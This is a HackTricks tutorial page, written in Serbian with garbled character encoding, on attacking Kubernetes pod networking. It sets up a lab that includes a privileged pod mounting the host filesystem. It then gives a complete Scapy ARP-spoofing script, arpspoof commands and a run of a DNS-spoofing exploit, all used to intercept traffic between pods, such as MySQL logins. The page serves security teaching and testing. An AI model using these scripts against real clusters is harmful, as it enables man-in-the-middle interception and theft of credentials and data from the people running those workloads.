# Napadi na Kubernetes mre≈æu

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

U Kubernetes-u se primeƒáuje da podrazumevano pona≈°anje omoguƒáava uspostavljanje veza izmeƒëu **svih kontejnera sme≈°tenih na istom ƒçvoru**. Ovo va≈æi bez obzira na razlike u imenovnom prostoru (namespace). Takva povezanost se prostire do **sloja 2** (Ethernet). Kao rezultat, ova konfiguracija potencijalno izla≈æe sistem ranjivostima. Konkretno, otvara moguƒánost za **zlonamerni kontejner** da izvr≈°i **ARP spoofing napad** na druge kontejnere sme≈°tene na istom ƒçvoru. Tokom takvog napada, zlonamerni kontejner mo≈æe prevarno presresti ili izmeniti mre≈æni saobraƒáaj namenjen drugim kontejnerima.

Napadi ARP spoofing-a ukljuƒçuju **napadaƒça koji ≈°alje la≈æne ARP** (Address Resolution Protocol) poruke preko lokalne mre≈æe. To rezultira povezivanjem **MAC adrese napadaƒça sa IP adresom legitimnog raƒçunara ili servera na mre≈æi**. Nakon uspe≈°nog izvr≈°enja takvog napada, napadaƒç mo≈æe presresti, izmeniti ili ƒçak zaustaviti podatke koji se prenose. Napad se izvr≈°ava na sloju 2 OSI modela, zbog ƒçega podrazumevana povezanost u Kubernetes-u na ovom sloju izaziva sigurnosne probleme.

U scenariju ƒáe biti kreirane 4 ma≈°ine:

* ubuntu-pe: Privilegovana ma≈°ina za bekstvo na ƒçvor i proveru metrika (nije potrebna za napad)
* **ubuntu-attack**: **Zlonamerni** kontejner u podrazumevanom imenovnom prostoru
* **ubuntu-victim**: **≈Ωrtvena** ma≈°ina u kube-system imenovnom prostoru
* **mysql**: **≈Ωrtvena** ma≈°ina u podrazumevanom imenovnom prostoru
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Osnovna Kubernetes mre≈æna infrastruktura

Ako ≈æelite vi≈°e detalja o mre≈ænim temama koje su ovde predstavljene, pogledajte reference.

### ARP

Opƒáenito govoreƒái, **mre≈æa izmeƒëu podova unutar ƒçvora** je dostupna putem **mosta** koji povezuje sve podove. Ovaj most se naziva "**cbr0**". (Neki mre≈æni dodaci ƒáe instalirati svoj sopstveni most.) **cbr0 takoƒëe mo≈æe rukovati ARP** (Address Resolution Protocol) rezolucijom. Kada dolazi dolazni paket na cbr0, mo≈æe se re≈°iti odredi≈°na MAC adresa koristeƒái ARP.

Ova ƒçinjenica implicira da, prema podrazumevanim pode≈°avanjima, **svaki pod koji se izvr≈°ava na istom ƒçvoru** ƒáe moƒái da **komunicira** sa bilo kojim drugim podom na istom ƒçvoru (nezavisno od imenskog prostora) na nivou Ethernet-a (sloj 2).

{% hint style="warning" %}
Stoga je moguƒáe izvr≈°iti napade **ARP Spoofing** izmeƒëu podova na istom ƒçvoru.
{% endhint %}

### DNS

U Kubernetes okru≈æenjima obiƒçno ƒáete pronaƒái 1 (ili vi≈°e) **DNS usluga koje se izvr≈°avaju** obiƒçno u kube-system imenskom prostoru:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
U prethodnim informacijama mo≈æete videti ne≈°to interesantno, **IP adresa servisa** je **10.96.0.10**, ali **IP adresa poda** na kojem se izvr≈°ava servis je **172.17.0.2**.

Ako proverite DNS adresu unutar bilo kog poda, pronaƒái ƒáete ne≈°to sliƒçno ovome:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Meƒëutim, **pod ne zna** kako da pristupi toj **adresi** jer je opseg poda u ovom sluƒçaju 172.17.0.10/26.

Stoga ƒáe pod poslati **DNS zahtev** na adresu 10.96.0.10 koja ƒáe biti **prevedena** od strane cbr0 **u** **172.17.0.2**.

{% hint style="warning" %}
To znaƒçi da ƒáe **DNS zahtev** poda uvek iƒái preko **mosta** kako bi se **preveo** **IP servisa u IP krajnje taƒçke**, ƒçak i ako je DNS server u istoj podmre≈æi kao pod.

Znajuƒái ovo, i znajuƒái da su **ARP napadi moguƒái**, pod na ƒçvoru ƒáe moƒái da **presretne saobraƒáaj** izmeƒëu **svakog poda** u **podmre≈æi** i mosta i **izmeni DNS odgovore** od DNS servera (**DNS prevara**).

Osim toga, ako je **DNS server** na **istom ƒçvoru kao napadaƒç**, napadaƒç mo≈æe **presresti sve DNS zahteve** bilo kog poda u klasteru (izmeƒëu DNS servera i mosta) i izmeniti odgovore.
{% endhint %}

## ARP prevara u podovima na istom ƒçvoru

Na≈° cilj je da **ukrademo komunikaciju barem od ubuntu-victim do mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoof —ò–µ —Ç–µ—Ö–Ω–∏–∫–∞ –Ω–∞–ø–∞–¥–∞ –∫–æ—ò–∞ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ –ø—Ä–µ–≤–∞—Ä—É —É –º—Ä–µ–∂–∏ –∑–∞—Å–Ω–æ–≤–∞–Ω–µ –Ω–∞ Ethernet-—É. –û–≤–∞ —Ç–µ—Ö–Ω–∏–∫–∞ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ –ø—Ä–µ–≤–∞—Ä—É —É –º—Ä–µ–∂–∏ —Ç–∞–∫–æ —à—Ç–æ —Å–µ —à–∞—ô—É –ª–∞–∂–Ω–∏ ARP –æ–¥–≥–æ–≤–æ—Ä–∏ –Ω–∞ —Ü–∏—ô–∞–Ω–µ —Ä–∞—á—É–Ω–∞—Ä–µ —É –º—Ä–µ–∂–∏. –û–≤–æ –æ–º–æ–≥—É—õ–∞–≤–∞ –Ω–∞–ø–∞–¥–∞—á—É –¥–∞ –ø—Ä–µ–≤–∞—Ä–∏ —Ä–∞—á—É–Ω–∞—Ä–µ —É –º—Ä–µ–∂–∏ –∏ –ø—Ä–µ—É—Å–º–µ—Ä–∏ —Å–∞–æ–±—Ä–∞—õ–∞—ò –ø—Ä–µ–∫–æ —Å–≤–æ–≥ —Ä–∞—á—É–Ω–∞—Ä–∞. –ù–∞–ø–∞–¥–∞—á –º–æ–∂–µ –¥–∞ –ø—Ä–∞—Ç–∏, —Å–Ω–∏–º–∞ –∏ –º–µ—ö–∞ —Å–∞–æ–±—Ä–∞—õ–∞—ò –∏–∑–º–µ—í—É —Ü–∏—ô–∞–Ω–æ–≥ —Ä–∞—á—É–Ω–∞—Ä–∞ –∏ –¥—Ä—É–≥–∏—Ö —Ä–∞—á—É–Ω–∞—Ä–∞ —É –º—Ä–µ–∂–∏. –û–≤–∞ —Ç–µ—Ö–Ω–∏–∫–∞ —ò–µ –∫–æ—Ä–∏—Å–Ω–∞ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ —Ä–∞–∑–ª–∏—á–∏—Ç–∏—Ö –Ω–∞–ø–∞–¥–∞, –∫–∞–æ —à—Ç–æ —Å—É Man-in-the-Middle –Ω–∞–ø–∞–¥–∏ –∏ —Å–Ω–∏–º–∞—ö–µ –ª–æ–∑–∏–Ω–∫–∏.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Kao ≈°to je veƒá pomenuto, ako **kompromitujete pod na istom ƒçvoru kao DNS server pod**, mo≈æete **MitM** sa **ARPSpoofingom** mosta i DNS poda i **izmeniti sve DNS odgovore**.

Imate veoma koristan **alat** i **tutorial** za testiranje ovoga na [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

U na≈°em scenariju, **preuzmite** **alat** na napadaƒçki pod i kreirajte **fajl nazvan `hosts`** sa **domenima** koje ≈æelite da **prevarite**, kao ≈°to je:
```
cat hosts
google.com. 1.1.1.1
```
Izvr≈°ite napad na ma≈°inu ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Ako poku≈°ate da napravite svoj DNS spoofing skript, ako **samo izmenite DNS odgovor**, to **neƒáe raditi**, jer ƒáe **odgovor** imati **izvor IP** adresu zlonamernog **poda** i **neƒáe** biti **prihvaƒáen**.\
Potrebno je generisati **novi DNS paket** sa **izvor IP** adresom **DNS-a** na koju ≈ærtva ≈°alje DNS zahtev (≈°to je ne≈°to poput 172.16.0.2, a ne 10.96.0.10, to je IP adresa K8s DNS servisa, a ne IP adresa DNS servera, vi≈°e o tome u uvodu).
{% endhint %}

## Snimanje saobraƒáaja

Alatka [**Mizu**](https://github.com/up9inc/mizu) je jednostavan, ali moƒáan preglednik API saobraƒáaja za Kubernetes koji vam omoguƒáava da **vidite svu komunikaciju API-ja** izmeƒëu mikroservisa kako biste pomogli u otklanjanju gre≈°aka i re≈°avanju problema.\
Instaliraƒáe agente u odabranim podovima i prikupiti informacije o njihovom saobraƒáaju i prikazati ih na veb serveru. Meƒëutim, za ovo ƒáe vam biti potrebne visoke K8s dozvole (i nije ba≈° neprimetno).

## Reference

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **ogla≈°avanje va≈°e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
